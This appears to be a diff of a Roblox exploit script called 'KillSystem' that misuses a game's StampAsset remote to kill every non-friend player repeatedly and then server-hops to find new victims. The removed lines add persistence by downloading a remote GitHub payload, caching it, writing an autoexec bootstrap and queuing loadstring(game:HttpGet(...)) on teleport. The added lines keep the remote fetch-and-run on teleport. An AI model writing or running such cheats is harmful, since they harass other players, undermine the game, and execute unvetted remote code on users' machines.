@@ -1,296 +1,241 @@
--- =====================================================
--- ✅ KillSystem with canonical PAYLOAD_URL, qot (%q) + writefile/autoexec fallback
--- =====================================================
+local KillSystem = {
+    Config = {
+        StampAssetId = 41324885,
+        CheckInterval = 0.1,
+        DefaultCFrameOffset = Vector3.new(0, -9e9, 0),
+        CameraFixDelay = 0.1,
+        ServerHopMaxRetries = 5,
+        ServerHopRetryDelay = 2,
+        WaitTimeout = 5,
+    },
+    Services = {},
+    Connections = {},
+    LPlate = nil,
+}
 
-if not game:IsLoaded() then game.Loaded:Wait() end
-
--- simple resolver helper
-local function pick(fn) return (type(fn) == "function") and fn or nil end
-
--- resolve queue_on_teleport exactly (syn/fluxus aliases included)
-local qot = pick(rawget(getfenv(), "queue_on_teleport"))
-    or pick(rawget(getfenv(), "queueteleport"))
-    or (syn and pick(syn.queue_on_teleport))
-    or (fluxus and pick(fluxus.queue_on_teleport))
-
--- disk APIs (if available)
-local writefile = pick(writefile)
-local readfile  = pick(readfile)
-local isfile    = pick(isfile)
-
--- canonical raw URL (use plain raw.githubusercontent.com form)
-local PAYLOAD_URL   = "https://raw.githubusercontent.com/NotH4xor/Bahasf/main/Loader/Payload"
-local PAYLOAD_PATH  = "KillSystem_Payload.lua"
-local AUTOEXEC_PATH = "autoexec/KillSystem_AutoExec.lua"
-
--- =====================================================
--- Installer that caches payload & drops tiny autoexec bootstrap (runs once if needed)
--- =====================================================
-local function installAutoexec()
-    if not (writefile and readfile) then
-        warn("[Installer] writefile/readfile not available -> cannot install autoexec fallback")
-        return
-    end
-
-    -- fetch payload and save to disk
-    local ok, res = pcall(game.HttpGet, game, PAYLOAD_URL)
-    if ok and res then
-        pcall(writefile, PAYLOAD_PATH, res)
-        print("[Installer] Cached KillSystem payload to disk:", PAYLOAD_PATH)
-    else
-        warn("[Installer] Failed to fetch payload:", res)
-    end
-
-    -- tiny bootstrapper that autoexec will run on next join
-    local bootstrap = ([[ 
--- KillSystem auto-bootstrap (dropped by installer)
-if isfile(%q) and readfile then
-    local s, e = pcall(loadstring, readfile(%q))
-    if s then
-        pcall(e)
-        print("[BOOTSTRAP] KillSystem reinjected from autoexec.")
-    else
-        warn("[BOOTSTRAP] Failed to load payload:", e)
-    end
-end
-]]):format(PAYLOAD_PATH, PAYLOAD_PATH)
-
-    -- write the bootstrap into autoexec folder
-    local ok2, err2 = pcall(writefile, AUTOEXEC_PATH, bootstrap)
-    if ok2 then
-        print("[Installer] Autoexec bootstrap written to:", AUTOEXEC_PATH)
-    else
-        warn("[Installer] Failed to write autoexec bootstrap:", err2)
-    end
+-- Connection manager for cleanup
+function KillSystem:AddConnection(connection)
+    table.insert(self.Connections, connection)
 end
 
--- =====================================================
--- Queue helpers: prefer queuing a readfile-loaded payload if cached, else queue URL
--- =====================================================
-local function ensurePayloadCached()
-    if writefile and readfile and (not isfile or not isfile(PAYLOAD_PATH)) then
-        local ok, res = pcall(game.HttpGet, game, PAYLOAD_URL)
-        if ok and res then
-            pcall(writefile, PAYLOAD_PATH, res)
-            print("[QOT] Cached payload to disk:", PAYLOAD_PATH)
-        else
-            warn("[QOT] Could not fetch payload for caching:", res)
+function KillSystem:CleanupConnections()
+    for _, conn in ipairs(self.Connections) do
+        conn:Disconnect()
+    end
+    self.Connections = {}
+end
+
+-- Safe WaitForChild with timeout
+local function safeWaitForChild(parent, childName, timeout)
+    timeout = timeout or KillSystem.Config.WaitTimeout
+    local start = tick()
+    while tick() - start < timeout do
+        local child = parent:FindFirstChild(childName)
+        if child then return child end
+        task.wait()
+    end
+    warn(string.format("Failed to find %s in %s within %d seconds", childName, parent.Name, timeout))
+    return nil
+end
+
+-- Initialize services
+function KillSystem:InitServices()
+    self.Services.HttpService = game:GetService("HttpService")
+    self.Services.TeleportService = game:GetService("TeleportService")
+    self.Services.Players = game:GetService("Players")
+    self.Services.ReplicatedStorage = game:GetService("ReplicatedStorage")
+    self.Services.Workspace = game:GetService("Workspace")
+end
+
+-- Find local plate
+function KillSystem:FindLocalPlate()
+    local plates = safeWaitForChild(self.Services.Workspace, "Plates")
+    if not plates then return nil end
+    for _, plate in ipairs(plates:GetChildren()) do
+        if plate:FindFirstChild("Owner") and plate.Owner.Value == self.Services.Players.LocalPlayer then
+            self.LPlate = safeWaitForChild(plate, "Plate")
+            return self.LPlate
         end
     end
+    warn("Local plate not found")
+    return nil
 end
 
-local function queuePayload(reason)
-    reason = reason or ""
-    if qot then
-        if readfile and isfile and isfile(PAYLOAD_PATH) then
-            print(("[QOT] Queued payload (disk) — %s"):format(reason))
-            -- queue a payload that will read from disk on next server
-            pcall(qot, ("loadstring(readfile(%q))()"):format(PAYLOAD_PATH))
-        else
-            print(("[QOT] Queued payload (URL) — %s"):format(reason))
-            -- queue a payload that will fetch the remote URL on next server
-            pcall(qot, ("loadstring(game:HttpGet(%q))()"):format(PAYLOAD_URL))
-        end
-    else
-        print("[QOT] queue_on_teleport not supported — installing autoexec fallback")
-        installAutoexec()
-    end
-end
-
--- Prime cache + pre-queue
-ensurePayloadCached()
-queuePayload("startup")
-
--- Backup hooks
-local TeleportService = game:GetService("TeleportService")
-local Players = game:GetService("Players")
-
-TeleportService.TeleportInitFailed:Connect(function()
-    ensurePayloadCached()
-    queuePayload("TeleportInitFailed")
-end)
-
-Players.LocalPlayer.OnTeleport:Connect(function(state)
-    if state == Enum.TeleportState.Started then
-        ensurePayloadCached()
-        queuePayload("OnTeleport.Started")
-    elseif state == Enum.TeleportState.InProgress then
-        ensurePayloadCached()
-        queuePayload("OnTeleport.InProgress")
-    end
-end)
-
-print("✅ Persistence system armed (qot + autoexec fallback)")
-
--- =====================================================
--- Kill System (unchanged core)
--- =====================================================
-
--- one-time guard per JobId
-if _G.KillSystemActive and _G.KillSystemActiveJobId == game.JobId then
-    warn("🚫 Kill system already active in this server")
-    return
-end
-_G.KillSystemActive = true
-_G.KillSystemActiveJobId = game.JobId
-
-local HttpService       = game:GetService("HttpService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Workspace         = game:GetService("Workspace")
-
-local LPlayer    = Players.LocalPlayer
-local Remotes    = ReplicatedStorage:WaitForChild("Remotes")
-local StampAsset = Remotes:WaitForChild("StampAsset")
-local LPlate
-
---// Find local plate
-do
-    local Plates = Workspace:FindFirstChild("Plates") or Workspace:WaitForChild("Plates", 2)
-    if Plates then
-        for _, plate in ipairs(Plates:GetChildren()) do
-            local owner = plate:FindFirstChild("Owner")
-            local ppart = plate:FindFirstChild("Plate")
-            if owner and ppart and owner.Value == LPlayer then
-                LPlate = ppart
-                break
-            end
-        end
-    end
-end
-
---// KillModule
+-- KillModule
 local KillModule = {}
 
-local function resolveTarget(target)
-    if typeof(target) == "Instance" then
-        if target:IsA("Player") then
-            local char = target.Character or target.CharacterAdded:Wait()
-            return char:WaitForChild("HumanoidRootPart", 5)
-        elseif target:IsA("BasePart") then
-            return target
+function KillModule:ResolveTarget(target)
+    if target:IsA("Player") then
+        local char
+        local success, result = pcall(function()
+            return target.Character or target.CharacterAdded:Wait()
+        end)
+        if not success or not result then
+            warn(string.format("Failed to resolve character for player %s: %s", target.Name, tostring(result)))
+            return nil
         end
+        char = result
+        local hrp = safeWaitForChild(char, "HumanoidRootPart", self.Config.WaitTimeout)
+        return hrp
+    elseif target:IsA("BasePart") then
+        return target
     end
+    return nil
 end
 
-local function invokeStamp(parts, cframe)
-    if not parts or not StampAsset then return end
+function KillModule:InvokeStamp(parts, cframe)
+    if not parts or not self.StampAsset then return end
     local ok, res = pcall(function()
-        return StampAsset:InvokeServer(41324885, cframe, "{}", parts, 0)
+        return self.StampAsset:InvokeServer(self.Config.StampAssetId, cframe, "{}", parts, 0)
     end)
-    if not ok then warn("[StampAsset Failed]:", res) end
+    if not ok then
+        warn("[StampAsset Failed]:", res)
+    end
     return res
 end
 
-function KillModule.Kill(target, cframeOverride)
-    local part = resolveTarget(target)
-    if part and LPlate then
-        local dest = cframeOverride or (LPlate.CFrame - Vector3.new(0, 9e9, 0))
-        return invokeStamp({ part }, dest)
+function KillModule:Kill(target, cframeOverride)
+    local part = self:ResolveTarget(target)
+    if part and self.LPlate then
+        local dest = cframeOverride or (self.LPlate.CFrame - self.Config.DefaultCFrameOffset)
+        return self:InvokeStamp({ part }, dest)
     end
 end
 
-function KillModule.KillMany(targets, cframeOverride)
+function KillModule:KillMany(targets, cframeOverride)
     local parts = {}
     for _, t in ipairs(targets) do
-        local p = resolveTarget(t)
-        if p then parts[#parts+1] = p end
+        local p = self:ResolveTarget(t)
+        if p then table.insert(parts, p) end
     end
-    if #parts > 0 and LPlate then
-        local dest = cframeOverride or (LPlate.CFrame - Vector3.new(0, 9e9, 0))
-        return invokeStamp(parts, dest)
+    if #parts > 0 and self.LPlate then
+        local dest = cframeOverride or (self.LPlate.CFrame - self.Config.DefaultCFrameOffset)
+        return self:InvokeStamp(parts, dest)
     end
 end
 
-function KillModule.AttachAll(interval)
-    interval = interval or 0.1
+function KillModule:AttachAll(interval)
+    interval = interval or self.Config.CheckInterval
     task.spawn(function()
-        while task.wait(interval) do
-            for _, p in ipairs(Players:GetPlayers()) do
-                if p ~= LPlayer and not LPlayer:IsFriendsWith(p.UserId) then
-                    local part = resolveTarget(p)
-                    if part and LPlate then
-                        invokeStamp({ part }, LPlate.CFrame)
-                    end
+        while true do
+            local targets = {}
+            for _, player in ipairs(self.Services.Players:GetPlayers()) do
+                if player ~= self.Services.Players.LocalPlayer and not self.Services.Players.LocalPlayer:IsFriendsWith(player.UserId) then
+                    local part = self:ResolveTarget(player)
+                    if part then table.insert(targets, part) end
                 end
             end
+            if #targets > 0 and self.LPlate then
+                self:InvokeStamp(targets, self.LPlate.CFrame)
+            end
+            task.wait(interval)
         end
     end)
 end
 
---// Auto monitor respawns
+-- Initialize system
+if _G.KillSystemActive then
+    warn("🚫 Kill system already active")
+    return
+end
+_G.KillSystemActive = true
+
+KillSystem:InitServices()
+KillSystem.LPlayer = KillSystem.Services.Players.LocalPlayer
+local Remotes = safeWaitForChild(KillSystem.Services.ReplicatedStorage, "Remotes")
+if not Remotes then return end
+KillModule.StampAsset = safeWaitForChild(Remotes, "StampAsset")
+if not KillModule.StampAsset then return end
+KillSystem.LPlate = KillSystem:FindLocalPlate()
+if not KillSystem.LPlate then return end
+
+-- Monitor player respawns
 local function monitorPlayer(player)
-    if player ~= LPlayer and not LPlayer:IsFriendsWith(player.UserId) then
-        player.CharacterAdded:Connect(function(character)
-            local hrp = character:WaitForChild("HumanoidRootPart")
-            KillModule.Kill(hrp)
-        end)
+    if player ~= KillSystem.LPlayer and not KillSystem.LPlayer:IsFriendsWith(player.UserId) then
+        KillSystem:AddConnection(player.CharacterAdded:Connect(function(character)
+            local hrp = safeWaitForChild(character, "HumanoidRootPart")
+            if hrp then
+                KillModule:Kill(hrp)
+            end
+        end))
     end
 end
 
-Players.PlayerAdded:Connect(monitorPlayer)
-for _, p in ipairs(Players:GetPlayers()) do
+KillSystem:AddConnection(KillSystem.Services.Players.PlayerAdded:Connect(monitorPlayer))
+for _, p in ipairs(KillSystem.Services.Players:GetPlayers()) do
     monitorPlayer(p)
 end
 
-KillModule.AttachAll(0.1)
-
--- ✅ Camera crash guard
+-- Camera crash guard
+local lastCameraFix = 0
 local function safeCameraFix()
-    local cam = Workspace.CurrentCamera
-    if cam and typeof(cam.CameraType) == "EnumItem" then
+    if tick() - lastCameraFix < KillSystem.Config.CameraFixDelay then return end
+    local cam = KillSystem.Services.Workspace.CurrentCamera
+    if cam and cam.CameraType ~= Enum.CameraType.Custom then
         cam.CameraType = Enum.CameraType.Custom
+        lastCameraFix = tick()
     end
 end
-task.defer(function() task.wait(0.1); safeCameraFix() end)
-Workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
-    task.wait(0.1)
+task.spawn(function()
+    task.wait(KillSystem.Config.CameraFixDelay)
     safeCameraFix()
 end)
+KillSystem:AddConnection(KillSystem.Services.Workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
+    task.wait(KillSystem.Config.CameraFixDelay)
+    safeCameraFix()
+end))
 
-print("✅ Kill system started (with camera crash guard)")
-
--- =====================================================
--- ServerHop (pre-queue and teleport)
--- =====================================================
+-- Server hopping
 local order = "Desc"
-local TeleportService = game:GetService("TeleportService")
-
 local function ServerHop()
     local url = string.format(
         "https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=%s&limit=100",
         game.PlaceId, order
     )
-    while true do
-        local success, result = pcall(game.HttpGet, game, url)
+    for attempt = 1, KillSystem.Config.ServerHopMaxRetries do
+        local success, result = pcall(function()
+            return game:HttpGet(url)
+        end)
         if success then
-            local decoded = HttpService:JSONDecode(result)
-            local servers = decoded.data
-            local chosen
-            for _, v in ipairs(servers) do
-                if v.maxPlayers > v.playing and v.id ~= game.JobId then
-                    chosen = v
-                    break
+            local decoded = KillSystem.Services.HttpService:JSONDecode(result)
+            for _, server in ipairs(decoded.data) do
+                if server.maxPlayers > server.playing and server.id ~= game.JobId then
+                    if typeof(queue_on_teleport) == "function" then
+                        pcall(queue_on_teleport, [[
+                            loadstring(game:HttpGet('https://raw.githubusercontent.com/NotH4xor/Bahasf/main/Loader/Payload'))()
+                        ]])
+                    end
+                    KillSystem.Services.TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id)
+                    return
                 end
-            end
-            if chosen then
-                ensurePayloadCached()
-                queuePayload("ServerHop pre-hop")
-                TeleportService:TeleportToPlaceInstance(game.PlaceId, chosen.id)
-                return
             end
             url = string.format(
                 "https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=%s&limit=100&cursor=%s",
                 game.PlaceId, order, decoded.nextPageCursor or ""
             )
+        else
+            warn(string.format("ServerHop failed: %s", tostring(result)))
         end
-        task.wait(2)
+        task.wait(KillSystem.Config.ServerHopRetryDelay * attempt)
     end
+    warn("ServerHop failed after maximum retries")
 end
 
+-- Run server hop watcher
 task.spawn(function()
     while task.wait(1) do
-        if #Players:GetPlayers() == 2 then
+        if #KillSystem.Services.Players:GetPlayers() == 2 then
             ServerHop()
         end
     end
 end)
+
+-- Start enforcement
+KillModule:AttachAll()
+
+-- Cleanup on script termination
+game:BindToClose(function()
+    KillSystem:CleanupConnections()
+end)
+
+print("✅ Kill system started (with camera crash guard)")
